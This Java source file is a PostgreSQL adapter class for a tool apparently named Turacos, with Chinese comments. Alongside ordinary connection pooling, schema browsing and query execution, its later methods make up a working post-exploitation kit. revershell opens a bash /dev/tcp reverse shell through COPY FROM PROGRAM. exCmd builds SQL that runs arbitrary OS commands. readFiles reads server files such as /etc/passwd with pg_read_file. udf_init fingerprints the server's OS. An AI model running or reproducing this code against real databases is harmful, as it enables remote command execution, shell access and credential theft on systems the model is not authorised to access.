package database;

import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;
import util.SqlHelpers;

import java.sql.*;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * PostgreSQL 适配器（JDBC + HikariCP 连接池）。
 *
 * <p>TLS 策略：优先 sslmode=require（强制加密且无需证书校验），
 * 失败回退 sslmode=prefer（JDBC 默认：自动尝试 TLS、再回退明文）并记录提示。
 */
public class psql implements DatabaseAdapter {

    private static final Logger LOG = Logger.getLogger(psql.class.getName());
    private static final int QUERY_TIMEOUT_SECONDS = 15;
    private static final int COPY_PROGRAM_TIMEOUT_SECONDS = 5;

    private final String host;
    private final String port;
    private final String database;
    private final String username;
    private final String password;

    private HikariDataSource pool = null;
    private Boolean tlsSupported = null;

    public psql(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = port;
        this.database = database;
        this.username = username;
        this.password = password;
        // 显式注册 PostgreSQL JDBC 驱动，避免打包环境未自动加载
        try {
            Class.forName("org.postgresql.Driver");
        } catch (ClassNotFoundException e) {
            LOG.log(Level.SEVERE, "[!] PostgreSQL JDBC 驱动未找到: " + e.getMessage(), e);
        }
    }

    // ----------------------------------------------------------- 连接与池化

    private static String urlSafe(String s) {
        return (s == null || s.isEmpty()) ? "postgres" : s.replaceAll("[^A-Za-z0-9_$.-]", "");
    }

    private String baseUrl(String sslMode) {
        return "jdbc:postgresql://" + host + ":" + port + "/" + urlSafe(database)
                + "?connectTimeout=15&socketTimeout=120&ApplicationName=Turacos" + sslMode;
    }

    /** 探测 TLS（sslmode=require）可用性；失败回退 prefer。返回最终 URL。 */
    private synchronized String effectiveUrl() {
        if (tlsSupported == null) {
            try (Connection tmp = DriverManager.getConnection(
                    baseUrl("&sslmode=require"), username, password)) {
                tlsSupported = Boolean.TRUE;
                LOG.info("[+] PostgreSQL TLS 连接成功（sslmode=require）");
            } catch (SQLException e) {
                tlsSupported = Boolean.FALSE;
                LOG.warning("[!] PostgreSQL TLS 不可用，回退 sslmode=prefer（自动尝试明文）: " + e.getMessage());
            }
        }
        return tlsSupported ? baseUrl("&sslmode=require") : baseUrl("&sslmode=prefer");
    }

    private synchronized HikariDataSource pool() {
        if (pool == null || pool.isClosed()) {
            HikariConfig cfg = new HikariConfig();
            cfg.setJdbcUrl(effectiveUrl());
            cfg.setUsername(username);
            cfg.setPassword(password);
            cfg.setPoolName("turacos-pg-" + host + ":" + port);
            cfg.setMaximumPoolSize(4);
            cfg.setMinimumIdle(1);
            cfg.setConnectionTimeout(15000);
            cfg.setValidationTimeout(5000);
            cfg.setAutoCommit(true);
            pool = new HikariDataSource(cfg);
        }
        return pool;
    }

    private Connection getConnection() throws SQLException {
        return pool().getConnection();
    }

    @Override
    public void close() {
        if (pool != null) {
            pool.close();
            pool = null;
        }
    }

    // ------------------------------------------------------------- 接口方法

    /**
     * 测试连接（可复用于探测；不影响池状态）
     */
    @Override
    public boolean testConnection() {
        try (Connection tmp = DriverManager.getConnection(effectiveUrl(), username, password)) {
            return tmp != null && !tmp.isClosed();
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 连接测试失败: " + e.getMessage());
            return false;
        }
    }

    @Override
    public List<String> getDatabases() {
        List<String> dbList = new ArrayList<>();
        try (Connection con = getConnection();
             Statement stmt = con.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT datname FROM pg_database WHERE datistemplate = false;")) {
            while (rs.next()) {
                dbList.add(rs.getString("datname"));
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[-] 获取数据库列表失败: " + e.getMessage());
        }
        return dbList;
    }

    @Override
    public List<String> getSchemas() {
        List<String> schemas = new ArrayList<>();
        String sql = "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql);
             ResultSet rs = ps.executeQuery()) {
            while (rs.next()) {
                schemas.add(rs.getString("schema_name"));
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取模式列表失败: " + e.getMessage());
        }
        return schemas;
    }

    @Override
    public List<String> getTables(String schema) {
        List<String> tables = new ArrayList<>();
        String sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = ? ORDER BY table_name";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setString(1, schema);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) {
                    tables.add(rs.getString("table_name"));
                }
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取表列表失败: " + e.getMessage());
        }
        return tables;
    }

    @Override
    public List<String> getColumnNames(String schema, String table) {
        List<String> columns = new ArrayList<>();
        String sql = "SELECT column_name FROM information_schema.columns WHERE table_schema = ? AND table_name = ? ORDER BY ordinal_position";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setString(1, schema);
            ps.setString(2, table);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) {
                    columns.add(rs.getString("column_name"));
                }
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 获取列信息失败: " + e.getMessage());
        }
        return columns;
    }

    @Override
    public List<List<Object>> getTopRows(String schema, String table, int limit) {
        List<List<Object>> rows = new ArrayList<>();
        int safeLimit = SqlHelpers.clampLimit(limit);
        // 标识符安全引用；LIMIT 参数绑定
        String sql = "SELECT * FROM " + SqlHelpers.quotePg(schema) + "." + SqlHelpers.quotePg(table) + " LIMIT ?";
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            ps.setInt(1, safeLimit);
            try (ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int colCount = meta.getColumnCount();
                while (rs.next()) {
                    List<Object> row = new ArrayList<>();
                    for (int i = 1; i <= colCount; i++) {
                        row.add(rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] 查询表数据失败: " + e.getMessage());
        }
        return rows;
    }

    /**
     * 执行任意 SQL 语句（支持多语句）：整串发送 + 逐结果集迭代。
     * 注意：此方法不会保活连接，连接由池管理；调用方只需 close() 释放池。
     */
    @Override
    public String executeSQL(String sql) throws SQLException {
        if (sql == null || sql.trim().isEmpty()) {
            return "[!] SQL语句不能为空！";
        }
        long t0 = System.currentTimeMillis();

        StringBuilder sb = new StringBuilder();
        try (Connection c = getConnection()) {
            boolean originalAutoCommit = c.getAutoCommit();
            try {
                c.setAutoCommit(true);

                try (Statement stmt = c.createStatement()) {
                    String lower = sql.toLowerCase();
                    int timeout = (lower.contains("copy") && lower.contains("program")) ? COPY_PROGRAM_TIMEOUT_SECONDS : QUERY_TIMEOUT_SECONDS;
                    stmt.setQueryTimeout(timeout);

                    boolean hasResultSet = stmt.execute(sql.trim());
                    while (true) {
                        if (hasResultSet) {
                            try (ResultSet rs = stmt.getResultSet()) {
                                while (rs.next()) {
                                    Object val = rs.getObject(1); // 只取第一列
                                    if (val != null && !val.toString().isEmpty()) {
                                        if (sb.length() > 0) sb.append("\n");
                                        sb.append(val.toString());
                                    }
                                }
                            }
                        } else {
                            int updateCount = stmt.getUpdateCount();
                            if (updateCount == -1) {
                                break;
                            }
                        }
                        hasResultSet = stmt.getMoreResults();
                    }
                } catch (SQLTimeoutException te) {
                    return audited("EXEC_SQL", sql, "[!] \uD83D\uDCA5SQL执行超时: " + te.getMessage() + "\n" + sb, t0);
                } catch (SQLException e) {
                    // 简单查询协议中出错后其余语句已被服务端终止
                    if (sb.length() > 0) sb.append("\n");
                    sb.append("[-] ").append(e.getMessage());
                }
            } finally {
                try {
                    c.setAutoCommit(originalAutoCommit);
                } catch (SQLException ignore) {
                }
            }
        }

        return audited("EXEC_SQL", sql, sb.toString() + "\n", t0);
    }

    /** 结构化查询（供合规检查等模块使用）：返回 列名->值 的行列表。 */
    @Override
    public List<Map<String, Object>> queryRows(String sql, String... params) throws SQLException {
        List<Map<String, Object>> rows = new ArrayList<>();
        try (Connection c = getConnection();
             PreparedStatement ps = c.prepareStatement(sql)) {
            for (int i = 0; i < params.length; i++) {
                ps.setString(i + 1, params[i]);
            }
            try (ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int n = meta.getColumnCount();
                while (rs.next()) {
                    Map<String, Object> row = new LinkedHashMap<>();
                    for (int i = 1; i <= n; i++) {
                        row.put(meta.getColumnLabel(i), rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        }
        return rows;
    }

    private String audited(String action, String detail, String result, long t0) {
        util.AuditLogger.log(action, "PostgreSQL", host, port, database, username, detail, result,
                System.currentTimeMillis() - t0);
        return result;
    }

    /**
     * 获取数据库基本信息，返回格式化字符串
     */
    @Override
    public String getDatabaseInfo() {
        StringBuilder sb = new StringBuilder();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {

            try (ResultSet rs = stmt.executeQuery("SELECT version();")) {
                if (rs.next()) {
                    sb.append("[+] Database Version: ").append(rs.getString(1)).append("\n");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SELECT current_user;")) {
                if (rs.next()) {
                    sb.append("[+] Current User: ").append(rs.getString(1)).append("\n");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles WHERE rolname = current_user;")) {
                if (rs.next()) {
                    sb.append("[+] Superuser: ").append(rs.getBoolean("rolsuper")).append("\n");
                    sb.append("[+] Can Create Role: ").append(rs.getBoolean("rolcreaterole")).append("\n");
                    sb.append("[+] Can Create DB: ").append(rs.getBoolean("rolcreatedb")).append("\n");
                    sb.append("[+] Can Login: ").append(rs.getBoolean("rolcanlogin")).append("\n");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SELECT current_database();")) {
                if (rs.next()) {
                    sb.append("[+] Connected Database: ").append(rs.getString(1)).append("\n");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SHOW data_directory;")) {
                if (rs.next()) {
                    sb.append("[+] Data directory: ").append(rs.getString(1)).append("\n");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SHOW config_file;")) {
                if (rs.next()) {
                    sb.append("[+] Config file: ").append(rs.getString(1)).append("\n");
                }
            }
        } catch (SQLException e) {
            sb.append("[-] \uD83D\uDCA5获取数据库信息失败: ").append(e.getMessage()).append("\n");
        }

        return sb.toString();
    }

    public List<String> udf_init() {
        List<String> sb = new ArrayList<>();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {

            try (ResultSet rs = stmt.executeQuery("SELECT substring(current_setting('server_version') FROM '^[0-9]+') AS major_version;")) {
                if (rs.next()) {
                    sb.add(rs.getString(1));
                } else {
                    sb.add("unknown");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SELECT CASE " + "WHEN version() ~* 'windows' OR version() ~* 'visual c\\+\\+' OR version() ~* 'vc' THEN 'windows' " + "WHEN version() ~* 'linux' OR version() ~* 'gnu' OR version() ~* 'freebsd' OR version() ~* 'solaris' OR version() ~* 'unix' THEN 'linux' " + "WHEN version() ~* 'darwin' OR version() ~* 'mac' THEN 'mac' " + "ELSE 'other' END AS os_type;")) {
                if (rs.next()) {
                    sb.add(rs.getString(1));
                } else {
                    sb.add("unknown");
                }
            }

            try (ResultSet rs = stmt.executeQuery("SELECT CASE WHEN strpos(version(), '64-bit') > 0 THEN '64' WHEN strpos(version(), '32-bit') > 0 THEN '32' ELSE 'unknown' END AS architecture;")) {
                if (rs.next()) {
                    sb.add(rs.getString(1));
                } else {
                    sb.add("unknown");
                }
            }

        } catch (SQLException e) {
            LOG.log(Level.INFO, "[!] udf_init: " + e.getMessage());
        }
        return sb;
    }

    public boolean revershell(String host, int port) throws SQLException {
        long t0 = System.currentTimeMillis();
        try (Connection c = getConnection();
             Statement stmt = c.createStatement()) {
            String sql = "drop table if exists cmd_exec;create table cmd_exec(cmd_output text);" + "copy cmd_exec from program '/bin/bash -c \"/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1\"';";
            stmt.execute(sql);
            util.AuditLogger.log("REVERSE_SHELL", "PostgreSQL", this.host, this.port, database, username,
                    host + ":" + port, "COPY FROM PROGRAM invoked", System.currentTimeMillis() - t0);
            return true;
        } catch (SQLException e) {
            util.AuditLogger.log("REVERSE_SHELL", "PostgreSQL", this.host, this.port, database, username,
                    host + ":" + port, "FAILED: " + e.getMessage(), System.currentTimeMillis() - t0);
            LOG.log(Level.INFO, "[!] " + e.getMessage());
            return false;
        }
    }

    /**
     * 生成执行系统命令的 SQL 语句
     *
     * @param cmd  要执行的系统命令
     * @param type SQL 类型（COPY 或 UDF）
     * @return 构造好的 SQL 语句
     */
    public static String exCmd(String cmd, String type) {

        if (cmd == null || cmd.isEmpty()) {
            cmd = "whoami";
        }

        cmd = cmd.replace("'", "''");

        String sqlTemplate = """
                DROP TABLE IF EXISTS cmd_exec;
                CREATE TABLE cmd_exec(cmd_output text);
                COPY cmd_exec FROM PROGRAM '%s' WITH ENCODING 'ISO-8859-1';
                SELECT * FROM cmd_exec;
                DROP TABLE IF EXISTS cmd_exec;
                """;

        String sqlTemplateAlt = """
                SELECT sys_eval('%s');
                """;

        if ("UDF".equalsIgnoreCase(type)) {
            return String.format(sqlTemplateAlt, cmd);
        }
        return String.format(sqlTemplate, cmd);
    }

    /**
     * 读取文件内容的 SQL 语句
     *
     * @param path 文件路径
     * @param type 读取方式：PG_Read / COPY / LOAD_FILE
     * @return 构造好的 SQL
     */
    public static String readFiles(String path, String type) {
        if (path == null || path.isEmpty()) {
            path = "/etc/passwd";
        }

        path = path.replace("'", "''");

        return switch (type) {
            case "PG_Read" -> String.format("SELECT pg_read_file('%s');", path);
            case "COPY" -> String.format("""
                    DROP TABLE IF EXISTS file_content;
                    CREATE TABLE file_content (content text);
                    COPY file_content FROM '%s';
                    SELECT * FROM file_content;
                    DROP TABLE file_content;
                    """, path);
            default -> "无效的类型: " + type;
        };
    }
}
